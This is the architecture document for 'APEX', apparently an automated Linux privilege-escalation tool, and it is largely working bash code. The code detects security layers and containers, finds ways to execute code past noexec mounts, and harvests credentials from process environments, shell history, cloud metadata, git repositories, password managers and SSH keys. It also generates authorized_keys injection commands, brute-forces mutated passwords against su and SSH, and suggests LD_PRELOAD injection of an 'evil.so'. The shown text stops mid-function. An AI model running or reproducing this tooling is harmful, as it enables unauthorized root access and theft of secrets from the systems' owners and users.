# APEX — Complete Technical Architecture
## Three Engines, Ten Adaptive Layers, Zero Assumptions

---

## 1. High-Level Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                        APEX RUNTIME                             │
│                                                                 │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────────────┐ │
│  │  PRE-FLIGHT  │ →  │  3 ENGINES  │ →  │   ADAPTIVE LAYERS   │ │
│  │   CHECKS    │    │             │    │   (fallback chain)  │ │
│  └─────────────┘    └─────────────┘    └─────────────────────┘ │
│                                                                 │
│  ┌─────────────────────────────────────────────────────────────┐│
│  │              ROBUSTNESS WRAPPER (ALL COMMANDS)              ││
│  │  timeout + /dev/null stdin + subshell + error isolation     ││
│  └─────────────────────────────────────────────────────────────┘│
│                                                                 │
│  ┌─────────────────────────────────────────────────────────────┐│
│  │              COMPATIBILITY LAYER (ALL COMMANDS)             ││
│  │  binary detection + fallback chains + format normalization  ││
│  └─────────────────────────────────────────────────────────────┘│
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
              ┌───────────────────────────────┐
              │    RANKED CONFIRMED OUTPUT    │
              │  Path 1: [95%] + exact cmd   │
              │  Path 2: [78%] + exact cmd   │
              │  Trap warnings per path       │
              │  Next layer if empty          │
              └───────────────────────────────┘
```

---

## 2. Pre-Flight Checks (Runs Before Everything)

Pre-flight determines HOW the tool runs, not what it finds.
Every subsequent function adapts based on pre-flight results.

### 2.1 Environment Detection

```bash
detect_environment() {
    # ── OS and Distro ──────────────────────────────────────────
    OS_ID=$(cat /etc/os-release 2>/dev/null | grep "^ID=" | cut -d= -f2 | tr -d '"')
    OS_VERSION=$(cat /etc/os-release 2>/dev/null | grep "^VERSION_ID=" | cut -d= -f2 | tr -d '"')
    KERNEL=$(uname -r)
    ARCH=$(uname -m)
    
    # ── Init System ────────────────────────────────────────────
    if command -v systemctl >/dev/null 2>&1 && systemctl status >/dev/null 2>&1; then
        INIT="systemd"
    elif [[ -f /etc/init.d/rc ]]; then
        INIT="sysvinit"
    elif command -v rc-service >/dev/null 2>&1; then
        INIT="openrc"
    elif command -v runit >/dev/null 2>&1; then
        INIT="runit"
    else
        INIT="unknown"
    fi
    
    # ── Package Manager ────────────────────────────────────────
    command -v dpkg   >/dev/null 2>&1 && PKG="dpkg"
    command -v rpm    >/dev/null 2>&1 && PKG="${PKG:-rpm}"
    command -v apk    >/dev/null 2>&1 && PKG="${PKG:-apk}"
    command -v pacman >/dev/null 2>&1 && PKG="${PKG:-pacman}"
    command -v zypper >/dev/null 2>&1 && PKG="${PKG:-zypper}"
    PKG="${PKG:-none}"
    
    # ── Available Binaries ─────────────────────────────────────
    HAS_GETCAP=0;    command -v getcap    >/dev/null 2>&1 && HAS_GETCAP=1
    HAS_STRINGS=0;   command -v strings   >/dev/null 2>&1 && HAS_STRINGS=1
    HAS_LDD=0;       command -v ldd       >/dev/null 2>&1 && HAS_LDD=1
    HAS_DEBSUMS=0;   command -v debsums   >/dev/null 2>&1 && HAS_DEBSUMS=1
    HAS_RPMV=0;      [[ "$PKG" == "rpm" ]] && HAS_RPMV=1
    HAS_BUSCTL=0;    command -v busctl    >/dev/null 2>&1 && HAS_BUSCTL=1
    HAS_PYTHON3=0;   command -v python3   >/dev/null 2>&1 && HAS_PYTHON3=1
    HAS_PYTHON2=0;   command -v python2   >/dev/null 2>&1 && HAS_PYTHON2=1
    HAS_PERL=0;      command -v perl      >/dev/null 2>&1 && HAS_PERL=1
    HAS_STRACE=0;    command -v strace    >/dev/null 2>&1 && HAS_STRACE=1
    
    # ── Timeout availability ───────────────────────────────────
    if command -v timeout >/dev/null 2>&1; then
        TIMEOUT_CMD="timeout"
    elif busybox timeout true >/dev/null 2>&1; then
        TIMEOUT_CMD="busybox timeout"
    else
        TIMEOUT_CMD="none"  # use background + kill fallback
    fi
    
    # ── Network tools ──────────────────────────────────────────
    command -v ss      >/dev/null 2>&1 && NET_TOOL="ss"
    command -v netstat >/dev/null 2>&1 && NET_TOOL="${NET_TOOL:-netstat}"
    NET_TOOL="${NET_TOOL:-none}"
    
    # ── find behavior (GNU vs BusyBox) ─────────────────────────
    # Test if -writable flag works
    find / -writable -maxdepth 0 >/dev/null 2>&1 && FIND_HAS_WRITABLE=1 || FIND_HAS_WRITABLE=0
    
    # ── stat behavior (GNU vs BSD) ─────────────────────────────
    stat -c "%U" /etc/passwd >/dev/null 2>&1 && STAT_GNU=1 || STAT_GNU=0
}
```

### 2.2 Security Layer Detection

```bash
detect_security_layers() {
    # ── SELinux ────────────────────────────────────────────────
    if command -v getenforce >/dev/null 2>&1; then
        SELINUX_STATUS=$(getenforce 2>/dev/null)
    elif [[ -f /sys/fs/selinux/enforce ]]; then
        SELINUX_STATUS=$(cat /sys/fs/selinux/enforce 2>/dev/null)
        [[ "$SELINUX_STATUS" == "1" ]] && SELINUX_STATUS="Enforcing" || SELINUX_STATUS="Permissive"
    else
        SELINUX_STATUS="Disabled"
    fi
    
    # ── AppArmor ───────────────────────────────────────────────
    if command -v aa-status >/dev/null 2>&1; then
        APPARMOR_STATUS=$(aa-status --enabled >/dev/null 2>&1 && echo "Enabled" || echo "Disabled")
    elif [[ -f /sys/kernel/security/apparmor/profiles ]]; then
        APPARMOR_STATUS="Enabled"
    else
        APPARMOR_STATUS="Disabled"
    fi
    
    # ── Seccomp ────────────────────────────────────────────────
    SECCOMP_STATUS=$(grep "Seccomp:" /proc/self/status 2>/dev/null | awk '{print $2}')
    # 0=disabled, 1=strict, 2=filter
    
    # ── Grsecurity / PaX ───────────────────────────────────────
    uname -r | grep -qi "grsec\|pax" && GRSEC=1 || GRSEC=0
    
    # ── ASLR ───────────────────────────────────────────────────
    ASLR=$(cat /proc/sys/kernel/randomize_va_space 2>/dev/null)
    
    # Warn if MAC is enforcing — our DAC graph may show false positives
    if [[ "$SELINUX_STATUS" == "Enforcing" || "$APPARMOR_STATUS" == "Enabled" ]]; then
        MAC_ACTIVE=1
        echo "[APEX-WARN] MAC security active. DAC-based paths may be blocked by policy."
        echo "[APEX-INFO] Adding MAC analysis module to detection queue."
    else
        MAC_ACTIVE=0
    fi
}
```

### 2.3 Container Detection

```bash
detect_container() {
    CONTAINER_TYPE="none"
    
    # Docker
    [[ -f /.dockerenv ]] && CONTAINER_TYPE="docker"
    
    # LXC/LXD
    grep -qa "lxc" /proc/1/cgroup 2>/dev/null && CONTAINER_TYPE="${CONTAINER_TYPE:-lxc}"
    
    # Generic container (cgroup check)
    grep -qa "docker\|containerd\|podman" /proc/1/cgroup 2>/dev/null && \
        CONTAINER_TYPE="${CONTAINER_TYPE:-container}"
    
    # Kubernetes
    [[ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]] && \
        CONTAINER_TYPE="kubernetes"
    
    # Check if we're PID 1 namespace (container) vs host
    if [[ -r /proc/1/sched ]]; then
        local init_name=$(awk '{print $1}' /proc/1/sched 2>/dev/null)
        [[ "$init_name" != "systemd" && "$init_name" != "init" ]] && \
            CONTAINER_TYPE="${CONTAINER_TYPE:-container}"
    fi
    
    [[ "$CONTAINER_TYPE" != "none" ]] && {
        echo "[APEX-INFO] Container detected: $CONTAINER_TYPE"
        echo "[APEX-INFO] Adding container escape module to queue."
        IS_CONTAINER=1
    }
}
```

### 2.4 Resource Constraint Detection

```bash
detect_resource_constraints() {
    # Memory
    local mem_free=$(awk '/MemFree/{print $2}' /proc/meminfo 2>/dev/null)
    if [[ -n "$mem_free" && "$mem_free" -lt 51200 ]]; then
        FIND_MAXDEPTH="-maxdepth 6"
        echo "[APEX-WARN] Low memory (${mem_free}kB) — limiting search depth"
    else
        FIND_MAXDEPTH=""
    fi
    
    # Fork limit
    local max_forks=$(ulimit -u 2>/dev/null)
    local cur_procs=$(ls /proc 2>/dev/null | grep -c '^[0-9]' 2>/dev/null)
    if [[ "$max_forks" != "unlimited" && -n "$max_forks" && -n "$cur_procs" ]]; then
        local available=$((max_forks - cur_procs))
        [[ "$available" -lt 30 ]] && PARALLEL=0 || PARALLEL=1
    else
        PARALLEL=1
    fi
    
    # Temp storage selection (prefer memory)
    if [[ -w /dev/shm ]]; then
        APEX_TMP=$(mktemp -d /dev/shm/apex_XXXXXX 2>/dev/null)
    elif [[ -w /tmp ]]; then
        APEX_TMP=$(mktemp -d /tmp/apex_XXXXXX 2>/dev/null)
    elif [[ -w /var/tmp ]]; then
        APEX_TMP=$(mktemp -d /var/tmp/apex_XXXXXX 2>/dev/null)
    elif [[ -w "$HOME" ]]; then
        APEX_TMP=$(mktemp -d "$HOME/.apex_XXXXXX" 2>/dev/null)
    else
        APEX_TMP=""
        MEMORY_ONLY_MODE=1
        echo "[APEX-WARN] No writable temp dir found — running in memory-only mode"
    fi
    
    # Cleanup handler
    trap 'cleanup_apex' INT TERM EXIT
}

cleanup_apex() {
    [[ -n "$APEX_TMP" ]] && rm -rf "$APEX_TMP" 2>/dev/null
    kill $(jobs -p) 2>/dev/null
}
```

### 2.5 Execution Primitive Discovery

```bash
detect_execution_primitives() {
    # What can we actually USE to execute code?
    # This determines what exploit commands we suggest
    
    EXEC_PRIMITIVES=()
    
    # Direct execution locations (writable + exec allowed)
    for dir in /tmp /dev/shm /var/tmp "$HOME" /run/user/$UID; do
        if [[ -w "$dir" ]]; then
            # Actually test exec (not just mount options — mount can lie)
            cp /bin/true "$dir/.apex_test_exec" 2>/dev/null && \
            chmod +x "$dir/.apex_test_exec" 2>/dev/null && \
            "$dir/.apex_test_exec" 2>/dev/null && \
            EXEC_PRIMITIVES+=("direct:$dir") 
            rm -f "$dir/.apex_test_exec" 2>/dev/null
        fi
    done
    
    # Interpreter-based execution (bypasses noexec on files)
    [[ $HAS_PYTHON3 -eq 1 ]] && EXEC_PRIMITIVES+=("interpreter:python3")
    [[ $HAS_PYTHON2 -eq 1 ]] && EXEC_PRIMITIVES+=("interpreter:python2")
    [[ $HAS_PERL -eq 1 ]]    && EXEC_PRIMITIVES+=("interpreter:perl")
    command -v awk >/dev/null 2>&1 && EXEC_PRIMITIVES+=("interpreter:awk")
    
    # memfd_create (kernel 3.17+, bypasses ALL noexec)
    if python3 -c "import ctypes; ctypes.CDLL(None).memfd_create(b'',0)" >/dev/null 2>&1; then
        EXEC_PRIMITIVES+=("memfd:python3")
    fi
    
    # /dev/tcp (pure bash, no binary needed)
    bash -c 'echo > /dev/tcp/127.0.0.1/1' 2>/dev/null && \
        EXEC_PRIMITIVES+=("devtcp:bash")
    
    # Transfer methods (for bringing compiled binaries)
    TRANSFER_METHODS=()
    command -v curl   >/dev/null 2>&1 && TRANSFER_METHODS+=("curl")
    command -v wget   >/dev/null 2>&1 && TRANSFER_METHODS+=("wget")
    command -v nc     >/dev/null 2>&1 && TRANSFER_METHODS+=("nc")
    command -v base64 >/dev/null 2>&1 && TRANSFER_METHODS+=("base64")
    # base64 is POSIX — always present. Final fallback always exists.
    
    echo "[APEX] Execution primitives: ${EXEC_PRIMITIVES[*]}"
    echo "[APEX] Transfer methods: ${TRANSFER_METHODS[*]}"
}
```

---

## 3. Engine 1 — The Mapper

Collects all data. No analysis yet. Pure exhaustive data collection.
All commands run in parallel where possible. All have timeouts. All are isolated.

### 3.1 Execution Surface Mapping

```bash
map_execution_surface() {
    # SUID binaries
    apex_find_suid > "$APEX_TMP/suid" &
    
    # SGID binaries  
    apex_find_sgid > "$APEX_TMP/sgid" &
    
    # Capabilities
    apex_get_caps > "$APEX_TMP/caps" &
    
    # Sudo rules (NON-INTERACTIVE — use -n flag)
    safe_run "sudo -n -l" 5 > "$APEX_TMP/sudo" &
    
    # All cron sources
    {
        safe_run "cat /etc/crontab" 5
        safe_run "ls /etc/cron.d/" 5 | xargs -I{} cat "/etc/cron.d/{}" 2>/dev/null
        safe_run "cat /var/spool/cron/crontabs/*" 5
        for user in $(cut -d: -f1 /etc/passwd 2>/dev/null); do
            safe_run "crontab -l -u $user" 3 2>/dev/null
        done
    } > "$APEX_TMP/cron" &
    
    # Systemd timers and services
    {
        safe_run "systemctl list-timers --all --no-pager" 10
        safe_run "systemctl list-units --type=service --all --no-pager" 10
    } > "$APEX_TMP/systemd" &
    
    # Socket-activated services
    safe_run "systemctl list-sockets --all --no-pager" 10 > "$APEX_TMP/sockets" &
    
    # D-Bus services
    [[ $HAS_BUSCTL -eq 1 ]] && safe_run "busctl list" 10 > "$APEX_TMP/dbus" &
    
    # Running processes as root (static snapshot)
    safe_run "ps aux" 5 > "$APEX_TMP/processes" &
    
    # /proc-based process enumeration (more complete)
    {
        for pid_dir in /proc/[0-9]*/; do
            local pid=$(basename "$pid_dir")
            local uid=$(awk '/^Uid:/{print $2}' "$pid_dir/status" 2>/dev/null)
            if [[ "$uid" == "0" ]]; then
                local cmd=$(cat "$pid_dir/cmdline" 2>/dev/null | tr '\0' ' ')
                local exe=$(readlink "$pid_dir/exe" 2>/dev/null)
                echo "PID=$pid EXE=$exe CMD=$cmd"
            fi
        done
    } > "$APEX_TMP/root_procs" &
    
    # Init.d scripts (for non-systemd)
    [[ "$INIT" != "systemd" ]] && \
        safe_run "ls -la /etc/init.d/" 5 > "$APEX_TMP/initd" &
    
    # Global watchdog: kill all if still running after 90 seconds
    ( sleep 90; kill $(jobs -p) 2>/dev/null ) &
    WATCHDOG_PID=$!
    
    wait
    kill $WATCHDOG_PID 2>/dev/null
}
```

### 3.2 Influence Surface Mapping

```bash
map_influence_surface() {
    # Direct writable files
    apex_find_writable > "$APEX_TMP/writable_files" &
    
    # Writable directories
    apex_find_writable_dirs > "$APEX_TMP/writable_dirs" &
    
    # Library load paths
    {
        cat /etc/ld.so.conf 2>/dev/null
        cat /etc/ld.so.conf.d/* 2>/dev/null
        echo "$LD_LIBRARY_PATH"
    } > "$APEX_TMP/lib_paths" &
    
    # /etc/ld.so.preload (CRITICAL — if writable = instant root)
    safe_run "cat /etc/ld.so.preload" 3 > "$APEX_TMP/ld_preload" &
    safe_run "ls -la /etc/ld.so.preload" 3 >> "$APEX_TMP/ld_preload" &
    
    # Python paths and .pth files
    {
        [[ $HAS_PYTHON3 -eq 1 ]] && python3 -c "import sys; print('\n'.join(sys.path))" 2>/dev/null
        find / -name "*.pth" $FIND_MAXDEPTH 2>/dev/null
        find / -name "site-packages" -type d $FIND_MAXDEPTH 2>/dev/null
    } > "$APEX_TMP/python_paths" &
    
    # Perl INC paths
    [[ $HAS_PERL -eq 1 ]] && \
        perl -e 'print join("\n", @INC)' 2>/dev/null > "$APEX_TMP/perl_paths" &
    
    # Current user groups and what they can access
    safe_run "id" 3 > "$APEX_TMP/identity" &
    safe_run "groups" 3 >> "$APEX_TMP/identity" &
    
    # Process environments (may contain credentials or writable env vars)
    {
        for pid_dir in /proc/[0-9]*/environ; do
            cat "$pid_dir" 2>/dev/null | tr '\0' '\n' | \
                grep -iE "pass|pwd|secret|key|token|api|cred"
        done
    } > "$APEX_TMP/proc_envs" &
    
    # NFS exports
    safe_run "cat /etc/exports" 3 > "$APEX_TMP/nfs" &
    safe_run "showmount -e localhost" 5 >> "$APEX_TMP/nfs" &
    
    # Writable writable systemd unit files
    find /etc/systemd /usr/lib/systemd /lib/systemd -writable 2>/dev/null \
        > "$APEX_TMP/writable_units" &
    
    # Global watchdog
    ( sleep 60; kill $(jobs -p) 2>/dev/null ) &
    WATCHDOG_PID=$!
    wait
    kill $WATCHDOG_PID 2>/dev/null
}
```

### 3.3 Credential Hunting
# Full spec: see 13_CREDENTIAL_AND_SECRET_DETECTION.md
# Implementation overview — all sub-scanners run in parallel:

```bash
run_credential_hunt() {
    # All sub-scanners run in parallel, each writes to own temp file
    scan_ssh_artifacts       > "${APEX_TMP}/creds_ssh.txt"      &
    scan_history_files       > "${APEX_TMP}/creds_history.txt"  &
    scan_process_environ     > "${APEX_TMP}/creds_proc.txt"     &
    scan_config_files        > "${APEX_TMP}/creds_config.txt"   &
    scan_cloud_credentials   > "${APEX_TMP}/creds_cloud.txt"    &
    scan_container_creds     > "${APEX_TMP}/creds_container.txt" &
    scan_database_creds      > "${APEX_TMP}/creds_db.txt"       &
    scan_git_repos           > "${APEX_TMP}/creds_git.txt"      &
    scan_password_managers   > "${APEX_TMP}/creds_pwmgr.txt"    &
    scan_network_creds       > "${APEX_TMP}/creds_net.txt"      &
    scan_app_specific_creds  > "${APEX_TMP}/creds_app.txt"      &
    scan_ssl_private_keys    > "${APEX_TMP}/creds_ssl.txt"      &
    scan_hot_files           > "${APEX_TMP}/creds_hot.txt"      &
    check_ssh_key_injection  > "${APEX_TMP}/creds_inject.txt"   &
    wait

    # Feed all found credentials into Credential DNA propagation
    cat "${APEX_TMP}"/creds_*.txt | grep "^CRED:" | \
    while IFS=: read _ type user pass path; do
        register_finding "CREDENTIAL" "$path" "type=$type user=$user" 75 "cred_hunt"
        propagate_credential "$user" "$pass" "$type" "$path"
    done
}

# ── SSH ARTIFACTS ────────────────────────────────────────────────────────────
# Covers: private keys (passphrase check), authorized_keys WRITABLE (inject exploit),
#         known_hosts (pivot map), SSH config (identity files, ProxyJump),
#         SSH agent socket hijacking (use another user's loaded keys),
#         SSH host keys readable (server impersonation)
# Full implementation: 13_CREDENTIAL_AND_SECRET_DETECTION.md Section 1

# ── HISTORY FILE CONTENT ANALYSIS ────────────────────────────────────────────
# NOT just dumping history — grep for commands typed WITH passwords inline:
#   mysql -u root -pSECRET, sshpass -p 'PASS', curl -u user:pass,
#   ansible-playbook -e "db_pass=X", openssl passwd -1 -salt X PASSWORD
# Pattern: az login|PASSW|passw|sshpass|curl.*-u|KEY=|TOKEN=|BEARER=|chpasswd
# Full implementation: 13_CREDENTIAL_AND_SECRET_DETECTION.md Section 2

# ── CLOUD CREDENTIALS ────────────────────────────────────────────────────────
# AWS: ~/.aws/credentials, env AWS_ACCESS_KEY_*, IMDS http://169.254.169.254/
# GCP: service account *.json files, IMDS metadata.google.internal
# Azure: ~/.azure/azureProfile.json, IMDS http://169.254.169.254/metadata/
# Terraform: *.tfstate (contains ALL provisioned resource passwords), *.tfvars
# Vault: ~/.vault-token
# Full implementation: 13_CREDENTIAL_AND_SECRET_DETECTION.md Section 3

# ── CONTAINER CREDENTIALS ────────────────────────────────────────────────────
# Docker: ~/.docker/config.json (base64-decode auth field for registry creds)
# Kubernetes: ~/.kube/config (tokens + certs), /var/run/secrets/k8s SA token
# Container env vars: PASSWORD|SECRET|TOKEN|KEY|DATABASE_URL (300+ var names)
# Full implementation: 13_CREDENTIAL_AND_SECRET_DETECTION.md Section 4

# ── DATABASE CREDENTIALS ─────────────────────────────────────────────────────
# MySQL: ~/.my.cnf, /etc/mysql/debian.cnf (often has root password)
# PostgreSQL: ~/.pgpass, pg_hba.conf trust entries
# MongoDB: test no-auth connection to 127.0.0.1:27017
# Redis: test no-auth PING to 127.0.0.1:6379 (CONFIG SET = file write as redis)
# SQLite: find *.db *.sqlite → extract password/hash columns
# Full implementation: 13_CREDENTIAL_AND_SECRET_DETECTION.md Section 5

# ── GIT REPOSITORY MINING ────────────────────────────────────────────────────
# git log --all --full-history → commits with "password|secret|token" in message
# git show $hash → extract actual credential from diff
# git stash show -p → uncommitted work with credentials
# .git/config remote URLs → https://user:password@github.com/...
# Full implementation: 13_CREDENTIAL_AND_SECRET_DETECTION.md Section 6

# ── PASSWORD MANAGERS ────────────────────────────────────────────────────────
# KeePass: find *.kdbx + detect running KeePassXC process (→ /proc/PID/mem hint)
# pass: ~/.password-store/*.gpg entries
# Vault token: ~/.vault-token
# Full implementation: 13_CREDENTIAL_AND_SECRET_DETECTION.md Section 7

# ── NETWORK AND APP CREDENTIALS ──────────────────────────────────────────────
# .netrc (FTP/HTTP basic auth), .pgpass, .curlrc, .wgetrc
# NetworkManager: /etc/NetworkManager/system-connections/ (WiFi passwords)
# /etc/fstab SMB credentials= references
# Web app configs: 20 config file names (wp-config.php, settings.py, .env, etc.)
# Jenkins: credentials.xml (encrypted secrets)
# Ansible: *.vault files, inventory files with ansible_password
# Rails: secrets.yml, master.key
# PHP files in /var/www: grep for $password = "..." patterns
# Full implementation: 13_CREDENTIAL_AND_SECRET_DETECTION.md Sections 8-9

# ── SSL/TLS PRIVATE KEYS ─────────────────────────────────────────────────────
# Find all *.pem *.key *.p12 *.pfx *.jks *.ovpn — check for PRIVATE KEY header
# .ovpn files: may have embedded credentials + auth-user-pass
# Full implementation: 13_CREDENTIAL_AND_SECRET_DETECTION.md Section 9

# ── HOT FILES LIST ───────────────────────────────────────────────────────────
# 50+ known sensitive filenames checked in every home dir:
# .aws/credentials, .kube/config, .docker/config.json, .vault-token,
# .netrc, .pgpass, .git-credentials, .pypirc, .npmrc, .ovpn,
# .kdbx, .htpasswd, .erlang.cookie, .gnupg/, .ssh/, etc.
# Full implementation: 13_CREDENTIAL_AND_SECRET_DETECTION.md Section 10

# ── WRITABLE AUTHORIZED_KEYS DETECTION ───────────────────────────────────────
# For each user: check if authorized_keys / .ssh dir / home dir writable
# If writable: register HIGH CONFIDENCE finding + generate inject exploit:
#   echo 'our_pubkey' >> /home/user/.ssh/authorized_keys
#   ssh -i our_privkey user@localhost
# Root's authorized_keys writable = 99% confidence CRITICAL
# Full implementation: 13_CREDENTIAL_AND_SECRET_DETECTION.md Section 11

# ── CREDENTIAL DNA PROPAGATION ───────────────────────────────────────────────
propagate_credential() {
    local username="$1" password="$2" source_type="$3" source_file="$4"
    # Generate mutations: original, Capitalized, UPPER, lower, +1, +123, +!, leet
    # Test each mutation against: su - root, su - user (via expect/pty),
    #   SSH localhost (via sshpass), MySQL root, PostgreSQL postgres
    # Full implementation: 13_CREDENTIAL_AND_SECRET_DETECTION.md Section 12
}

# ── PROCESS ENVIRONMENT (300+ variable name patterns) ────────────────────────
scan_process_environ() {
    # NOT just PASS|PASSWORD — full pattern list:
    local CRED_VARS="PASSWORD|PASSWD|SECRET|TOKEN|API_KEY|AUTH|CREDENTIAL|DB_PASS|DATABASE_URL|PRIVATE_KEY|ACCESS_KEY|AWS_|GCP_|AZURE_|GITHUB_TOKEN|GITLAB_TOKEN|SLACK_TOKEN|STRIPE_|PAYPAL_|SENDGRID_|MAILGUN_|TWILIO_|HEROKU_API"
    for pid in /proc/[0-9]*/; do
        [ -r "${pid}environ" ] || continue
        tr '\0' '\n' < "${pid}environ" 2>/dev/null | grep -E "$CRED_VARS" | while read var; do
            local uid
            uid=$(grep "^Uid:" "${pid}status" 2>/dev/null | awk '{print $2}')
            echo "CRED:PROC_ENV:uid_${uid:-?}:$var:${pid}environ"
        done
    done
}
```

---

## 4. Engine 2 — The Deep Reader

Reads content of everything found in Engine 1's execution graph.
Follows all chains recursively up to 5 hops.

### 4.1 Script Deep Reader

```bash
read_script_deeply() {
    local script="$1"
    local depth="${2:-0}"
    local call_chain="${3:-$script}"
    
    # Prevent infinite recursion
    [[ $depth -gt 5 ]] && return
    
    # Prevent re-reading same file
    [[ -n "${ALREADY_READ[$script]}" ]] && return
    ALREADY_READ["$script"]=1
    
    # Cannot read — HIGH SIGNAL (root reads this, we can't)
    if [[ ! -r "$script" ]]; then
        echo "[UNREADABLE_SIGNAL] $script"
        echo "  Chain: $call_chain"
        echo "  Root reads this but you cannot — find alternate read path"
        echo "  Check: /var/backups, *.bak, *.old, git history, /tmp copies"
        return
    fi
    
    local content=$(cat "$script" 2>/dev/null)
    
    # ── Check if file itself is writable ──────────────────────
    if [[ -w "$script" ]]; then
        echo "[WRITABLE_IN_CHAIN] $script"
        echo "  Chain depth: $depth hops from root execution"
        echo "  Call chain: $call_chain"
        register_finding "WRITE_IN_CHAIN" "$script" "$call_chain" 90
    fi
    
    # ── Source/dot commands ───────────────────────────────────
    echo "$content" | grep -E "^\s*(\.|source)\s+" | \
        grep -oE '["/][^"[:space:]]+|[A-Za-z_][A-Za-z0-9_]*/[^"[:space:]]+' | \
        while IFS= read -r sourced; do
            # Expand simple variables if possible
            sourced_expanded=$(eval echo "$sourced" 2>/dev/null || echo "$sourced")
            
            if [[ -w "$sourced_expanded" ]]; then
                echo "[SOURCE_INJECT] $sourced_expanded writable"
                echo "  Chain: $call_chain → source $sourced_expanded"
                register_finding "SOURCE_INJECT" "$sourced_expanded" "$call_chain" 92
            fi
            read_script_deeply "$sourced_expanded" $((depth+1)) "$call_chain → $sourced_expanded"
        done
    
    # ── Commands without full path (PATH hijack) ──────────────
    # Extract commands that don't start with /
    echo "$content" | grep -vE "^\s*#" | \
        grep -oE '(^|[;|&`$(])\s*[a-zA-Z][a-zA-Z0-9_-]+' | \
        grep -oE '[a-zA-Z][a-zA-Z0-9_-]+' | \
        grep -vE "^(if|then|else|fi|for|while|do|done|case|esac|echo|exit|return|local|export|declare|read|test|true|false|in|function|select|until|continue|break|shift|set|unset|trap|wait|eval|exec|source|printf|cd|pwd|mkdir|rmdir|rm|cp|mv|ls|cat|grep|sed|awk|cut|sort|uniq|head|tail|tr|wc|find|chmod|chown|touch|date|sleep|kill|ps|env|export|PATH|HOME|USER|SHELL|TERM|IFS)$" | \
        while IFS= read -r cmd; do
            check_path_hijackable "$cmd" "$script" "$call_chain"
        done
    
    # ── Eval statements ───────────────────────────────────────
    echo "$content" | grep -E "eval\s*[\"'\`\$]" | while IFS= read -r line; do
        echo "[EVAL_FOUND] $script line: $line"
        echo "  Trace what controls this eval input — may be injectable"
    done
    
    # ── Config file reads ─────────────────────────────────────
    echo "$content" | grep -oE '["\x27][/][^"'\'']+\.(conf|cfg|env|ini|json|yaml|yml)["\x27]' | \
        tr -d "\"'" | while IFS= read -r conf; do
            [[ -w "$conf" ]] && {
                echo "[CONFIG_INJECT] $conf writable, read by $script"
                register_finding "CONFIG_INJECT" "$conf" "$call_chain" 85
            }
            read_script_deeply "$conf" $((depth+1)) "$call_chain → $conf"
        done
    
    # ── Output redirections ───────────────────────────────────
    echo "$content" | grep -oE '>+\s*[/][^[:space:];]+' | \
        grep -oE '[/][^[:space:];]+' | while IFS= read -r outfile; do
            echo "[OUTPUT_REDIRECT] $script writes to: $outfile"
            [[ -w "$outfile" || -w "$(dirname $outfile)" ]] && {
                echo "[OUTPUT_INJECT] $outfile writable — script output injectable"
                register_finding "OUTPUT_INJECT" "$outfile" "$call_chain" 70
            }
        done
    
    # ── Call external scripts/binaries ────────────────────────
    echo "$content" | grep -oE '[/][/a-zA-Z0-9._-]+' | sort -u | \
        while IFS= read -r called; do
            [[ -f "$called" ]] || continue
            read_script_deeply "$called" $((depth+1)) "$call_chain → $called"
        done
}
```

### 4.2 Binary Deep Reader

```bash
read_binary_deeply() {
    local binary="$1"
    local context="$2"
    
    [[ ! -f "$binary" ]] && return
    [[ ! -r "$binary" ]] && {
        echo "[UNREADABLE_BINARY] $binary ($context) — cannot analyze"
        return
    }
    
    # ── Strings analysis ──────────────────────────────────────
    if [[ $HAS_STRINGS -eq 1 ]]; then
        local str_output=$(strings "$binary" 2>/dev/null)
        
        # Absolute path references
        echo "$str_output" | grep -E "^/[a-zA-Z]" | sort -u | \
            while IFS= read -r path; do
                [[ -e "$path" ]] || continue
                [[ -w "$path" ]] && {
                    echo "[BINARY_PATH_WRITABLE] $binary references writable: $path"
                    register_finding "BINARY_PATH_WRITE" "$path" "$context" 75
                }
                [[ -d "$path" && -w "$path" ]] && {
                    echo "[BINARY_DIR_WRITABLE] $binary references writable dir: $path"
                    register_finding "BINARY_DIR_WRITE" "$path" "$context" 80
                }
            done
        
        # Commands without full path (PATH hijack)
        echo "$str_output" | grep -E '^[a-z][a-z0-9_-]{1,20}$' | \
            grep -vE "^(lib|usr|bin|etc|var|tmp|opt|sys|proc|dev|run|home)$" | \
            while IFS= read -r cmd; do
                check_path_hijackable "$cmd" "$binary" "$context"
            done
        
        # Dangerous function calls
        echo "$str_output" | grep -iE "system\(|execv|popen|setuid|setgid" | \
            while IFS= read -r dangerous; do
                echo "[DANGEROUS_FUNC] $binary contains: $dangerous"
            done
    fi
    
    # ── Library dependencies ──────────────────────────────────
    if [[ $HAS_LDD -eq 1 ]]; then
        ldd "$binary" 2>/dev/null | grep -oE '/[^ ]+\.so[^ ]*' | \
            while IFS= read -r lib; do
                [[ -w "$lib" ]] && {
                    echo "[LIB_WRITABLE] $binary loads writable library: $lib"
                    register_finding "LIB_HIJACK" "$lib" "$context" 85
                }
                # Check if library DIRECTORY is writable (can place fake lib)
                local libdir=$(dirname "$lib")
                [[ -w "$libdir" ]] && {
                    echo "[LIB_DIR_WRITABLE] Can place fake library in: $libdir"
                    register_finding "LIB_DIR_HIJACK" "$libdir" "$context" 80
                }
            done
    fi
}
```

### 4.3 Systemd Unit Deep Reader

```bash
read_unit_deeply() {
    local unit="$1"
    
    local unit_content=$(safe_run "systemctl cat $unit" 10)
    
    # ExecStart binary/script
    echo "$unit_content" | grep "^ExecStart=" | \
        grep -oE '=[^ ]+' | tr -d '=' | while IFS= read -r exec_path; do
            [[ -w "$exec_path" ]] && {
                echo "[UNIT_EXEC_WRITABLE] $unit ExecStart: $exec_path is writable"
                register_finding "UNIT_EXEC_WRITE" "$exec_path" "$unit" 95
            }
            read_script_deeply "$exec_path" 0 "systemd:$unit → $exec_path"
            read_binary_deeply "$exec_path" "systemd:$unit"
        done
    
    # EnvironmentFile
    echo "$unit_content" | grep "^EnvironmentFile=" | \
        grep -oE '=[-/][^ ]+' | tr -d '=' | while IFS= read -r envfile; do
            [[ "${envfile:0:1}" == "-" ]] && envfile="${envfile:1}"  # strip optional -
            [[ -w "$envfile" ]] && {
                echo "[ENVFILE_WRITABLE] $unit EnvironmentFile: $envfile is writable"
                echo "  Inject: LD_PRELOAD=/tmp/evil.so or PYTHONPATH=/tmp"
                register_finding "ENVFILE_INJECT" "$envfile" "$unit" 90
            }
        done
    
    # WorkingDirectory
    echo "$unit_content" | grep "^WorkingDirectory=" | \
        grep -oE '=[^ ]+' | tr -d '=' | while IFS= read -r workdir; do
